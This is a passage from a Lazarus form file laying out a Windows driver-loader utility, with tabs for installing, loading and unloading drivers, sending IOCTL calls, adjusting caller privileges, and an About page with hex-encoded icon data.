          Hint = 'Write driver entry to the registry. If "SymLink" option enabled then symbolic link will be created and it name will be written to the registry as ImagePath for given driver.'
          Top = 288
          Width = 75
          Caption = 'Install'
          OnClick = ButtonNativeInstallClick
          ParentShowHint = False
          ShowHint = True
          TabOrder = 6
        end
        object ButtonNativeLoad: TButton
          Tag = 1
          Left = 202
          Height = 25
          Hint = 'Load driver using provided parameters.'
          Top = 288
          Width = 75
          Caption = 'Load'
          OnClick = ButtonNativeLoadClick
          ParentShowHint = False
          ShowHint = True
          TabOrder = 7
        end
        object ButtonNativeRemove: TButton
          Tag = 3
          Left = 364
          Height = 25
          Hint = 'Remove driver entry from registry.'
          Top = 288
          Width = 75
          Caption = 'Remove'
          OnClick = ButtonNativeRemoveClick
          ParentShowHint = False
          ShowHint = True
          TabOrder = 9
        end
        object Label10: TLabel
          Left = 10
          Height = 15
          Top = 16
          Width = 35
          Caption = 'Name:'
          ParentColor = False
        end
        object EditNativeName: TEdit
          AnchorSideRight.Control = GroupBox3
          AnchorSideRight.Side = asrBottom
          Left = 96
          Height = 23
          Hint = 'Name of the service entry, this is mandatory parameter.'
          Top = 12
          Width = 468
          Anchors = [akTop, akLeft, akRight]
          BorderSpacing.Right = 10
          ParentShowHint = False
          ShowHint = True
          TabOrder = 0
        end
        object ButtonNativeUnload: TButton
          Tag = 2
          Left = 284
          Height = 25
          Hint = 'Unload driver using provided parameters.'
          Top = 288
          Width = 75
          Caption = 'Unload'
          OnClick = ButtonNativeUnloadClick
          ParentShowHint = False
          ShowHint = True
          TabOrder = 8
        end
        object GroupBox7: TGroupBox
          AnchorSideRight.Control = GroupBox3
          AnchorSideRight.Side = asrBottom
          AnchorSideBottom.Side = asrBottom
          Left = 8
          Height = 80
          Top = 184
          Width = 556
          Anchors = [akTop, akLeft, akRight]
          BorderSpacing.Right = 10
          Caption = 'Additional (un)load options'
          ClientHeight = 60
          ClientWidth = 552
          TabOrder = 10
          object CheckBoxSymLink: TCheckBox
            Left = 16
            Height = 19
            Hint = 'Enable symbolic link usage for driver loading.'
            Top = 4
            Width = 65
            Caption = 'SymLink'
            OnClick = CheckBoxSymLinkClick
            ParentShowHint = False
            ShowHint = True
            TabOrder = 0
          end
          object EditNativeSymLink: TEdit
            AnchorSideRight.Control = GroupBox7
            AnchorSideRight.Side = asrBottom
            Left = 91
            Height = 23
            Hint = 'Enter symbolic link name (only) that will be used while loading driver.'
            Top = 0
            Width = 451
            Anchors = [akTop, akLeft, akRight]
            BorderSpacing.Right = 10
            Enabled = False
            ParentShowHint = False
            ShowHint = True
            TabOrder = 1
          end
          object CheckBoxForceLoad: TCheckBox
            Left = 16
            Height = 19
            Hint = 'When loading driver, if it instance already present in memory then attempt to unload this driver and load it again.'
            Top = 32
            Width = 153
            Caption = 'Unload previous instance'
            ParentShowHint = False
            ShowHint = True
            TabOrder = 2
          end
        end
        object LabelPrivInfo: TLabel
          Left = 10
          Height = 15
          Top = 376
          Width = 23
          Caption = 'Hint'
          ParentColor = False
        end
      end
    end
    object IoctlSheet: TTabSheet
      Caption = 'I/O Control'
      ClientHeight = 443
      ClientWidth = 598
      OnShow = IoctlSheetShow
      object PageControl2: TPageControl
        AnchorSideLeft.Control = IoctlSheet
        AnchorSideTop.Control = IoctlSheet
        AnchorSideRight.Control = IoctlSheet
        AnchorSideBottom.Control = IoctlSheet
        Left = 10
        Height = 423
        Top = 10
        Width = 578
        ActivePage = TabSheet2
        Align = alClient
        BorderSpacing.Left = 10
        BorderSpacing.Top = 10
        BorderSpacing.Right = 10
        BorderSpacing.Bottom = 10
        TabIndex = 0
        TabOrder = 0
        object TabSheet2: TTabSheet
          Caption = 'Call Driver'
          ClientHeight = 395
          ClientWidth = 570
          object GroupBox2: TGroupBox
            AnchorSideRight.Control = TabSheet2
            AnchorSideRight.Side = asrBottom
            Left = 8
            Height = 120
            Top = 48
            Width = 552
            Anchors = [akTop, akLeft, akRight]
            BorderSpacing.Right = 10
            Caption = 'Control Code'
            ClientHeight = 100
            ClientWidth = 548
            TabOrder = 0
            object EditDevType: TEdit
              Left = 8
              Height = 23
              Top = 15
              Width = 64
              MaxLength = 4
              OnKeyPress = EditIoCtlCodeKeyPress
              OnKeyUp = EditDevTypeKeyUp
              TabOrder = 0
              Text = '0'
            end
            object Label20: TLabel
              Left = 8
              Height = 15
              Top = 0
              Width = 63
              Caption = 'Device Type'
              ParentColor = False
            end
            object EditFunctionId: TEdit
              Left = 77
              Height = 23
              Top = 15
              Width = 56
              MaxLength = 4
              OnKeyPress = EditIoCtlCodeKeyPress
              OnKeyUp = EditDevTypeKeyUp
              TabOrder = 1
              Text = '0'
            end
            object Label23: TLabel
              Left = 80
              Height = 15
              Top = 0
              Width = 47
              Caption = 'Function'
              ParentColor = False
            end
            object ComboBoxIoAccess: TComboBox
              AnchorSideRight.Side = asrBottom
              Left = 136
              Height = 23
              Top = 15
              Width = 246
              Font.CharSet = ANSI_CHARSET
              Font.Color = clBlack
              Font.Height = -12
              Font.Name = 'Segoe UI'
              Font.Pitch = fpVariable
              Font.Quality = fqDraft
              ItemHeight = 15
              ItemIndex = 0
              Items.Strings = (
                'FILE_ANY_ACCESS'
                'FILE_READ_ACCESS'
                'FILE_WRITE_ACCESS'
                'FILE_READ_ACCESS|FILE_WRITE_ACCESS'
              )
              OnChange = BuildIoCtl
              ParentFont = False
              ParentShowHint = False
              ShowHint = True
              Style = csDropDownList
              TabOrder = 2
              Text = 'FILE_ANY_ACCESS'
            end
            object Label24: TLabel
              AnchorSideRight.Control = Label25
              Left = 248
              Height = 15
              Top = 0
              Width = 36
              Caption = 'Access'
              ParentColor = False
            end
            object ComboBoxIoMethod: TComboBox
              AnchorSideLeft.Side = asrBottom
              AnchorSideRight.Side = asrBottom
              Left = 387
              Height = 23
              Top = 15
              Width = 147
              ItemHeight = 15
              ItemIndex = 0
              Items.Strings = (
                'METHOD_BUFFERED'
                'METHOD_IN_DIRECT'
                'METHOD_OUT_DIRECT'
                'METHOD_NEITHER'
              )
              OnChange = BuildIoCtl
              Style = csDropDownList
              TabOrder = 3
              Text = 'METHOD_BUFFERED'
            end
            object Label25: TLabel
              AnchorSideRight.Control = GroupBox2
              AnchorSideRight.Side = asrBottom
              Left = 440
              Height = 15
              Top = 0
              Width = 42
              Caption = 'Method'
              ParentColor = False
            end
            object EditIoctlValue: TEdit
              AnchorSideRight.Side = asrBottom
              Left = 8
              Height = 23
              Hint = 'Code must be hexadecimal form without any special prefixes, e.g. "0x" or "$".'
              Top = 63
              Width = 149
              MaxLength = 8
              OnChange = EditIoctlValueChange
              OnKeyPress = EditIoCtlCodeKeyPress
              ParentShowHint = False
              ShowHint = True
              TabOrder = 4
              Text = '00000000'
            end
            object Label11: TLabel
              Left = 8
              Height = 15
              Top = 48
              Width = 63
              Caption = 'Result value'
              ParentColor = False
            end
          end
          object Label17: TLabel
            Left = 8
            Height = 15
            Top = 21
            Width = 70
            Caption = 'Device Name'
            ParentColor = False
          end
          object CheckBoxUseFiles: TCheckBox
            Left = 8
            Height = 19
            Top = 184
            Width = 95
            Caption = 'Use File Buffer'
            OnChange = CheckBoxUseFilesChange
            TabOrder = 1
          end
          object Label18: TLabel
            Left = 8
            Height = 15
            Top = 218
            Width = 63
            Caption = 'Input Buffer'
            ParentColor = False
          end
          object Label19: TLabel
            Left = 8
            Height = 15
            Top = 250
            Width = 73
            Caption = 'Output Buffer'
            ParentColor = False
          end
          object EditInBufferName: TEdit
            AnchorSideLeft.Control = TabSheet2
            AnchorSideRight.Side = asrBottom
            Left = 96
            Height = 23
            Top = 216
            Width = 400
            Anchors = [akTop, akLeft, akRight]
            BorderSpacing.Left = 96
            BorderSpacing.Right = 50
            Enabled = False
            ReadOnly = True
            TabOrder = 2
          end
          object EditOutBufferName: TEdit
            AnchorSideLeft.Control = TabSheet2
            AnchorSideRight.Side = asrBottom
            Left = 96
            Height = 23
            Top = 247
            Width = 400
            Anchors = [akTop, akLeft, akRight]
            BorderSpacing.Left = 96
            BorderSpacing.Right = 50
            Enabled = False
            ReadOnly = True
            TabOrder = 3
          end
          object ButtonOutBufferBrowse: TButton
            Tag = 2
            AnchorSideRight.Side = asrBottom
            Left = 503
            Height = 25
            Top = 246
            Width = 33
            Anchors = [akTop, akRight]
            BorderSpacing.Right = 10
            Caption = '...'
            Enabled = False
            OnClick = ButtonInBufferBrowseClick
            TabOrder = 4
          end
          object ButtonInBufferBrowse: TButton
            Tag = 1
            AnchorSideRight.Side = asrBottom
            Left = 503
            Height = 25
            Top = 215
            Width = 33
            Anchors = [akTop, akRight]
            BorderSpacing.Right = 10
            Caption = '...'
            Enabled = False
            OnClick = ButtonInBufferBrowseClick
            TabOrder = 5
          end
          object Label21: TLabel
            Left = 8
            Height = 15
            Top = 292
            Width = 103
            Caption = 'Input Buffer Length'
            ParentColor = False
          end
          object SpinEditInputBuffer: TSpinEdit
            Left = 136
            Height = 23
            Top = 288
            Width = 97
            MaxValue = 16777216
            OnChange = SpinEditInputBufferChange
            TabOrder = 6
          end
          object ButtonIoctlReset: TButton
            Left = 247
            Height = 25
            Top = 288
            Width = 95
            Caption = 'Reset'
            OnClick = ButtonIoctlResetClick
            TabOrder = 7
          end
          object Label22: TLabel
            Left = 8
            Height = 15
            Top = 327
            Width = 113
            Caption = 'Output Buffer Length'
            ParentColor = False
          end
          object SpinEditOutputBuffer: TSpinEdit
            Left = 136
            Height = 23
            Top = 321
            Width = 97
            MaxValue = 16777216
            TabOrder = 8
          end
          object CheckBoxOutBuffer: TCheckBox
            Left = 247
            Height = 19
            Top = 321
            Width = 172
            Caption = 'Output Buffer Same As Input'
            OnChange = CheckBoxOutBufferChange
            TabOrder = 9
          end
          object CheckBoxFillByte: TCheckBox
            Left = 392
            Height = 19
            Top = 288
            Width = 122
            Caption = 'Fill Buffer with Byte'
            TabOrder = 10
          end
          object EditIoctlFill: TEdit
            Left = 520
            Height = 23
            Top = 288
            Width = 32
            MaxLength = 2
            TabOrder = 11
            Text = 'ff'
          end
          object ButtonCallDriver: TButton
            AnchorSideRight.Side = asrCenter
            Left = 8
            Height = 25
            Top = 360
            Width = 107
            Caption = 'Call Driver'
            OnClick = ButtonCallDriverClick
            TabOrder = 12
          end
          object EditDeviceName: TComboBox
            Left = 96
            Height = 23
            Top = 17
            Width = 464
            AutoComplete = True
            AutoCompleteText = [cbactEnabled, cbactEndOfLineComplete, cbactSearchAscending]
            AutoDropDown = True
            ItemHeight = 15
            Items.Strings = (
              '\Device\Beep'
            )
            TabOrder = 13
          end
        end
      end
    end
    object OptionsSheet: TTabSheet
      Caption = 'Options'
      ClientHeight = 443
      ClientWidth = 598
      OnShow = OptionsSheetShow
      object GroupBox9: TGroupBox
        AnchorSideLeft.Control = OptionsSheet
        AnchorSideRight.Control = OptionsSheet
        Left = 10
        Height = 423
        Top = 10
        Width = 578
        Align = alClient
        Anchors = [akTop, akLeft, akRight]
        BorderSpacing.Left = 10
        BorderSpacing.Top = 10
        BorderSpacing.Right = 10
        BorderSpacing.Bottom = 10
        Caption = 'Adjust Caller Privileges'
        ClientHeight = 403
        ClientWidth = 574
        TabOrder = 0
        object ListViewPrivSet: TListView
          AnchorSideLeft.Control = GroupBox9
          AnchorSideTop.Control = GroupBox9
          AnchorSideRight.Control = GroupBox9
          AnchorSideBottom.Control = GroupBox9
          Left = 10
          Height = 383
          Top = 10
          Width = 554
          Align = alClient
          BorderSpacing.Left = 10
          BorderSpacing.Top = 10
          BorderSpacing.Right = 10
          BorderSpacing.Bottom = 10
          Checkboxes = True
          Columns = <          
            item
              Caption = 'Privilege'
              Width = 400
            end>
          GridLines = True
          Items.LazData = {
            F605000023000000FFFFFFFFFFFFFFFFFFFFFFFF000000001600000053654372
            65617465546F6B656E50726976696C656765FFFFFFFFFFFFFFFFFFFFFFFF0000
            00001D000000536541737369676E5072696D617279546F6B656E50726976696C
            656765FFFFFFFFFFFFFFFFFFFFFFFF000000001500000053654C6F636B4D656D
            6F727950726976696C656765FFFFFFFFFFFFFFFFFFFFFFFF0000000018000000
            5365496E63726561736551756F746150726976696C656765FFFFFFFFFFFFFFFF
            FFFFFFFF000000001900000053654D616368696E654163636F756E7450726976
            696C656765FFFFFFFFFFFFFFFFFFFFFFFF000000000E00000053655463625072
            6976696C656765FFFFFFFFFFFFFFFFFFFFFFFF00000000130000005365536563
            757269747950726976696C656765FFFFFFFFFFFFFFFFFFFFFFFF000000001800
            0000536554616B654F776E65727368697050726976696C656765FFFFFFFFFFFF
            FFFFFFFFFFFF000000001500000053654C6F616444726976657250726976696C
            656765FFFFFFFFFFFFFFFFFFFFFFFF0000000018000000536553797374656D50
            726F66696C6550726976696C656765FFFFFFFFFFFFFFFFFFFFFFFF0000000015
            000000536553797374656D54696D6550726976696C656765FFFFFFFFFFFFFFFF
            FFFFFFFF000000001F000000536550726F66696C6553696E676C6550726F6365
            737350726976696C656765FFFFFFFFFFFFFFFFFFFFFFFF000000001F00000053
            65496E637265617365426173655072696F7269747950726976696C656765FFFF
            FFFFFFFFFFFFFFFFFFFF00000000190000005365437265617465506167656669
            6C6550726976696C656765FFFFFFFFFFFFFFFFFFFFFFFF000000001A00000053
            654372656174655065726D616E656E7450726976696C656765FFFFFFFFFFFFFF
            FFFFFFFFFF000000001100000053654261636B757050726976696C656765FFFF
            FFFFFFFFFFFFFFFFFFFF00000000120000005365526573746F72655072697669
            6C656765FFFFFFFFFFFFFFFFFFFFFFFF0000000013000000536553687574646F
            776E50726976696C656765FFFFFFFFFFFFFFFFFFFFFFFF000000001000000053
            65446562756750726976696C656765FFFFFFFFFFFFFFFFFFFFFFFF0000000010
            0000005365417564697450726976696C656765FFFFFFFFFFFFFFFFFFFFFFFF00
            0000001C000000536553797374656D456E7669726F6E6D656E7450726976696C
            656765FFFFFFFFFFFFFFFFFFFFFFFF000000001700000053654368616E67654E
            6F7469667950726976696C656765FFFFFFFFFFFFFFFFFFFFFFFF000000001900
            0000536552656D6F746553687574646F776E50726976696C656765FFFFFFFFFF
            FFFFFFFFFFFFFF00000000110000005365556E646F636B50726976696C656765
            FFFFFFFFFFFFFFFFFFFFFFFF0000000014000000536553796E634167656E7450
            726976696C656765FFFFFFFFFFFFFFFFFFFFFFFF000000001B0000005365456E
            61626C6544656C65676174696F6E50726976696C656765FFFFFFFFFFFFFFFFFF
            FFFFFF000000001700000053654D616E616765566F6C756D6550726976696C65
            6765FFFFFFFFFFFFFFFFFFFFFFFF00000000160000005365496D706572736F6E
            61746550726976696C656765FFFFFFFFFFFFFFFFFFFFFFFF0000000017000000
            5365437265617465476C6F62616C50726976696C656765FFFFFFFFFFFFFFFFFF
            FFFFFF000000001F000000536554727573746564437265644D616E4163636573
            7350726976696C656765FFFFFFFFFFFFFFFFFFFFFFFF00000000120000005365
            52656C6162656C50726976696C656765FFFFFFFFFFFFFFFFFFFFFFFF00000000
            1D0000005365496E637265617365576F726B696E6753657450726976696C6567
            65FFFFFFFFFFFFFFFFFFFFFFFF0000000013000000536554696D655A6F6E6550
            726976696C656765FFFFFFFFFFFFFFFFFFFFFFFF000000001D00000053654372
            6561746553796D626F6C69634C696E6B50726976696C656765FFFFFFFFFFFFFF
            FFFFFFFFFF0000000029000000536544656C656761746553657373696F6E5573
            6572496D706572736F6E61746550726976696C656765
          }
          ReadOnly = True
          RowSelect = True
          TabOrder = 0
          ViewStyle = vsReport
          OnMouseDown = ListViewPrivSetMouseDown
        end
      end
    end
    object AboutSheet: TTabSheet
      Caption = 'About'
      ClientHeight = 443
      ClientWidth = 598
      OnShow = AboutSheetShow
      object Image1: TImage
        Left = 8
        Height = 64
        Top = 8
        Width = 64
        Picture.Data = {
          055449636F6E3E42000000000100010040400000010020002842000016000000
          2800000040000000800000000100200000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          000000000000000000000000000000004E4C4C2D4F4D4D1A0000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          000000000000000000000000706E6DA6676464AF696766526B6A690700000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          00000000565656014E4C4C434C4A4AB75C5A5AFE696766C25857570500000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000817F7E4CCDCBCBFFC4C2C2FF9C9A99FF7A7776ED716E6D97
          7471703A6E6C6C01000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000054525205
          4C4A4A594C4B4ACD605E5DFF7E7C7BFF8E8C8BFF928F8EFF6E6C6B8A00000000
          0000000000000000000000000000000000000000000000000000000000000000
          000000006B69690BB3B1B1DFD8D6D6FFD5D3D2FFD2D1CFFFCECDCBFFB4B2B1FF
          949291FF7D7A79DA7B78773F0000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000004E4D4C444E4C4CE0
          626060FF7E7B7AFF898785FF8E8C8BFF949190FF999695FF969392FE6B69684E
          0000000000000000000000000000000000000000000000000000000000000000
          000000009997968AD7D5D5FFD5D3D2FFD2D1CFFFCFCECCFFCDCBCAFFCAC8C7FF
          C7C5C4FFC0BEBCFF8683824E0000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          000000000000000000000000000000000000000000000000504E4E4E7B7877FF
          848180FF898785FF8E8C8BFF949190FF999795FF9F9C9BFFA3A1A0FF959392EE
          6866662100000000000000000000000000000000000000000000000000000000
          7D7B7A2EC6C4C3FAD5D3D2FFD2D1CFFFCFCECCFFCDCBCAFFCAC8C7FFC7C5C4FF
          C4C2C1FFBAB8B6FF82807F2A0000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          000000000000000000000000000000000000000000000000555453137A7776FD
          898786FF8F8C8BFF949190FF999795FF9F9C9BFFA4A1A0FFA8A6A5FFAEACABFF
          918F8ECA68666507000000000000000000000000000000000000000075737202
          ACAAA9C6D5D3D2FFD2D1CFFFCFCECCFFCDCBCAFFCAC8C7FFC7C5C4FFC4C2C1FF
          C1BFBDFFB0AEADFC848280080000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          00000000000000000000000000000000000000000000000000000000787574D2
          8F8C8BFF949190FF999795FF9F9C9BFFA4A1A0FFA8A6A5FFAEACABFFB3B1B0FF
          B7B5B4FF888584AD6E6B6A8F777574AE827F7EC0868382C6878583C08D8A89C0
          D1CFCEFFD2D1CFFFCFCECCFFCDCBCAFFCAC8C7FFC7C5C4FFC4C2C0FFC1BFBDFF
          BEBCBBFFA9A7A6E0000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000076737394
          949190FF999796FF9F9C9BFFA4A1A0FFA9A6A5FFAEACABFFB3B1B0FFB9B7B5FF
          BEBCBAFFBFBDBBFFC3C1C0FFCDCCCBFFD3D1D0FFD7D5D5FFD8D6D6FFD5D3D2FF
          D2D1CFFFCFCECCFFCDCBCAFFCAC8C7FFC7C5C4FFC4C2C0FFC1BFBDFFBEBCBBFF
          BBB9B7FFA3A19FBC000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          000000000000000000000000000000000000000000000000000000006C6A6957
          999695FF9F9C9BFFA4A1A0FFA9A7A5FFAEACABFFB3B1B0FFB9B7B5FFBEBCBAFF
          C3C1C0FFC8C7C5FFCECCCBFFD3D1D0FFD7D5D5FFD8D6D6FFD5D3D2FFD2D1CFFF
          CFCECCFFCDCBCAFFC9C8C7FFC7C5C4FFC4C2C0FFC1BFBDFFBEBCBBFFBBB9B7FF
          B8B6B4FF9B999797000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          000000000000000000000000000000000000000000000000000000006361611A
          959291FEA4A1A0FFA9A7A5FFAEACABFFB3B1B0FFB9B7B5FFBEBCBAFFC3C1C0FF
          C8C7C6FFCECCCBFFD3D1D0FFD7D5D5FFD8D6D5FFD5D3D2FFD2D0CFFFCFCECCFF
          CDCBCAFFC9C8C7FFC6C5C4FFC4C2C0FFC1BFBDFFBEBCBBFFBBB9B7FFB8B6B4FF
          B5B3B2FF8F8C8B77000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          8F8D8CDFA9A7A5FFAEACABFFB4B2B0FFB9B7B5FFBEBCBAFFC3C2C0FFC9C7C6FF
          CECCCBFFD3D1D0FFD3D1D0FFC7C5C5FFBBB9B8FFBBB9B8FFC2C0BFFFC8C7C5FF
          CAC8C7FFC6C5C4FFC4C2C0FFC1BFBDFFBEBCBBFFBBB9B7FFB8B6B4FFB5B3B2FF
          B3B0AFFF8C8A89F1757372580000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000006F6D6C016F6C6B88
          959391FFAFACABFFB4B2B0FFB9B7B5FFBEBCBAFFC3C2C0FFC9C7C6FFCBC9C8FF
          C1C0BEFFB2B0AFFFADABAAFFB0AEADFFB1AFAFFFB6B4B4FFBEBDBCFFC5C4C3FF
          CFCDCCFFD9D8D7FFDCDBDAFFC6C4C3FFBBB9B7FFB8B6B4FFB5B3B2FFB3B0AFFF
          B0ADACFFADAAA9FF92908EFE73706F8466666601000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          00000000000000000000000000000000000000006B6A6901726F6E97989594FF
          AFACABFFB4B2B0FFB9B7B5FFBEBCBBFFC4C2C0FFCFCECDFFD3D1D0FFCECCCCFF
          D2D0CFFFD9D8D7FFDBD9D9FFDBDAD9FFDBDADAFFDBDADAFFDBDADAFFDBDAD9FF
          DBD9D9FFDAD9D8FFDFDDDDFFE1DFDFFFA19F9EFFA09E9CFFB2B0AFFFB0ADACFF
          ADABA9FFAAA8A6FFA7A5A3FF93908FFF6E6C6B946C6969010000000000000000
          0000000067656401646262267A7877627573739E61605F420000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          000000000000000000000000000000000000000074717086989695FFAFACABFF
          B4B2B0FFB9B7B5FFBEBCBBFFC9C7C6FFE7E6E5FFE0DFDEFFD7D5D4FFD6D4D4FF
          D6D4D4FFD6D4D4FFD6D4D4FFD6D4D4FFD6D4D4FFD6D4D4FFD6D4D4FFD6D4D4FF
          D6D4D4FFD6D4D4FFD6D4D4FFD6D4D4FFD0CECDFF9A9897FF7A7777FFA4A2A0FF
          AAA8A6FFA7A5A3FFA4A2A0FFA19F9EFF8D8B8AFF6A6767846A6767357E7C7B71
          8D8B8AAD979594E8A9A7A5FFB6B4B2FFACAAA8FF5E5C5BBF0000000000000000
          0000000000000000000000000000000000000000000000000000000000000000
          000000000000000000000000000000006563635C6F6D6C8E7371706A6F6D6C47
          6D6A6A236E6C6B0500000000000000007472715893908FFEAFACABFFB4B2B0FF
          B9B7B5FFBEBCBBFFB8B5B4FFCAC9C8FFDCDAD9FFD1D0CEFFD1D0CEFFD1D0CEFF
          D1D0CEFFD1D0CEFFD1D0CEFFD1D0CEFFD1D0CEFFD1D0CEFFD1D0CEFFD1D0CEFF
          D1D0CEFFD1D0CEFFD1D0CEFFD1D0CEFFD1D0CEFFD1D0CEFFB7B5B4FF716F6EFF
          949291FFA4A2A0FFA19F9EFF9F9C9BFFA09D9CFF979594FFA2A09EFFABA9A7FF
          AFACABFFB3B0AFFFB6B4B3FFBAB8B6FFBEBCBAFF7A7877FF5957563700000000
          0000000000000000000000000000000000000000000000000000000000000000
          00000000000000000000000064636201696766DA83817FFF8A8786FF8E8C8BFF
          908D8CFF8F8C8BFA908D8CDB918F8EB8908E8CF1AFACABFFB4B2B0FFB9B7B5FF
          BEBCBBFFA6A3A2FF908E8CFFCAC8C7FFCCCAC9FFCCCAC9FFCCCAC9FFCCCAC9FF
          CCCAC9FFCCCAC9FFCCCAC9FFCCCAC9FFCCCAC9FFCCCAC9FFCCCAC9FFCCCAC9FF
          CCCAC9FFCCCAC9FFCCCAC9FFCCCAC9FFCCCAC9FFCCCAC9FFCCCAC9FFC4C2C1FF
          767473FF8C8A89FF9F9C9BFFA09D9CFFA3A1A0FFA7A5A3FFABA9A7FFAFACABFF
          B3B1AFFFB6B4B3FFBAB8B6FFBEBCBAFFC2C0BEFFADABAAFF555252AE00000000
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000006B69683B757372FF8A8786FF8F8D8CFF959291FF
          9A9796FF9F9C9BFFA4A2A0FFA9A7A5FFAFACABFFB4B2B1FFB9B7B5FFBEBCBBFF
          A7A5A4FF747271FFC5C3C2FFC6C5C4FFC6C5C3FFC6C5C3FFC6C5C3FFC6C5C3FF
          C6C5C3FFC6C5C3FFC6C5C3FFC6C5C3FFC6C5C3FFC6C5C3FFC6C5C3FFC6C5C3FF
          C6C5C3FFC6C5C3FFC6C5C3FFC6C5C3FFC6C5C3FFC6C5C3FFC6C5C3FFC6C5C4FF
          C3C2C0FF747271FF908D8CFFA3A1A0FFA7A5A3FFABA9A7FFAFADABFFB3B1AFFF
          B6B4B3FFBAB8B6FFBEBCBAFFC2C0BEFFC6C4C3FFC9C8C7FF706E6DFD53515128
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000000000006F6C6B9A848180FF8F8D8CFF959291FF9A9796FF
          9F9D9BFFA4A2A0FFA9A7A6FFAFADABFFB4B2B1FFB9B7B6FFBEBCBBFFB8B6B4FF
          656362FFBBB9B8FFC1BFBDFFC1BFBDFFC1BFBDFFC1BFBDFFC1BFBDFFC1BFBDFF
          C1BFBDFFC1BFBDFFC1BFBDFFC1BFBDFFC1BFBDFFC1BFBDFFC1BFBDFFC1BFBDFF
          C1BFBDFFC1BFBDFFC1BFBDFFC1BFBDFFC1BFBDFFC1BFBDFFC1BFBDFFC1BFBDFF
          C1BFBDFFBBB9B8FF6D6B6AFFA09E9DFFABA9A7FFAFADABFFB3B1AFFFB6B4B3FF
          BAB8B6FFBEBCBAFFC2C0BEFFC6C4C3FFC9C8C7FFCDCCCAFFACABAAFF5452529C
          0000000000000000000000000000000000000000000000000000000000000000
          0000000000000000716F6D09767372EF8F8D8CFF959291FF9A9796FF9F9D9CFF
          A4A2A1FFA9A7A6FFAFADABFFB4B2B1FFB9B7B6FFBEBCBBFFC4C2C0FF72706FFF
          A3A1A0FFBDBBB9FFBCBAB8FFBCBAB8FFBCBAB8FFBCBAB8FFBCBAB8FFBCBAB8FF
          BCBAB8FFBCBAB8FFBCBAB8FFBCBAB8FFBCBAB8FFBCBAB8FFBCBAB8FFBCBAB8FF
          BCBAB8FFBCBAB8FFBCBAB8FFBCBAB8FFBCBAB8FFBCBAB8FFBCBAB8FFBCBAB8FF
          BCBAB8FFBDBBB9FFA6A4A3FF777574FFAFADABFFB3B1AFFFB6B4B3FFBAB8B7FF
          BEBCBBFFC2C0BEFFC6C4C3FFCAC8C7FFCDCCCAFFD1D0CEFFD4D3D2FF706E6DF8
          5D5B5B1A00000000000000000000000000000000000000000000000000000000
          000000000000000076747259838180FF959291FF9A9796FF9F9D9CFFA4A2A1FF
          A9A7A6FFAFADABFFB4B2B1FFB9B7B6FFBEBDBBFFC4C2C1FFA7A6A5FF737170FF
          BAB8B7FFB6B4B3FFB6B4B3FFB6B4B3FFB6B4B3FFB6B4B3FFB6B4B3FFB6B4B3FF
          B6B4B3FFB8B6B4FFBDBBB9F8B0ADACB698959484908E8D75B5B3B185CDCBCAB8
          C5C4C2F9B4B2B0FFB6B4B3FFB6B4B3FFB6B4B3FFB6B4B3FFB6B4B3FFB6B4B3FF
          B6B4B3FFB6B4B3FFBBB8B7FF7E7C7AFF9E9C9BFFB6B4B3FFBAB8B7FFBEBCBBFF
          C2C0BEFFC6C4C3FFCAC8C7FFCDCCCAFFD1D0CEFFD5D3D2FFC7C5C4FC84828282
          5F5E5E0400000000000000000000000000000000000000000000000000000000
          00000000000000007A7776B8918F8DFF9A9796FFA09D9CFFA4A2A1FFA9A7A6FF
          AFADABFFB4B2B1FFB9B7B6FFBFBDBBFFC4C2C1FFC9C7C6FF6D6B6AFFAAA8A6FF
